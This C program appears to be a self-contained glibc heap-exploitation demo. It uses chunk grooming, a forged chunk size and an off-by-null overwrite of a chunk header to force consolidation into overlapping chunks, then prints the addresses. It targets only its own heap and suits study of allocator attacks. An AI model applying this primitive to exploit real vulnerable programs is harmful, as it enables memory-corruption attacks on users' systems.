#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    void *a=malloc(0x410);
    malloc(0x540); //padding 
    void *b0 = malloc(0x430);
    void *c0 = malloc(0x430);
    void *padding=malloc(0x100); //padding 
    void *h0 = malloc(0x4f0);
    void *d = malloc(0x420);
    malloc(0x10); // padding 

    free(a);
    free(c0);
    free(d);
    free(b0);  //merge b0 with c0   and save c0->fd  c0->bk 
   
    void *b1 = malloc(0x450); //split  merge b0 with c0
    ((long *)b1)[0x438/8] = 0x551;  // c0->size=0x551
    void *c1 = malloc(0x410);
    a=malloc(0x410);
    d = malloc(0x420);  // get back


    free(a);
    free(c1);  // c1->a
    a=malloc(0x410);
    ((char *)a)[8]='\x00';  // a->bk=c0
    c1 = malloc(0x410);

    free(c1);
    free(d);  // d->c1
    free(h0);  //merge h0 with d     
    void *h1=malloc(0x4f0+0x20);
    ((char *)h1)[0x500]='\x00';
    void *d1=malloc(0x400);
    c1=malloc(0x410);
    

    free(padding);
    padding=malloc(0x108);
    ((long*)padding)[0x100/8]=0x550;   // h0->prevsize   
    ((char*)padding)[0x108]='\x00';   // h0->size  off by null 
    free(h1);  //merge h1 with c0


    void* split=malloc(0x540);
    printf("split heap address %p \n",split);
    printf("c0 heap address %p \n",c0);
    printf("padding heap address %p \n",padding);
}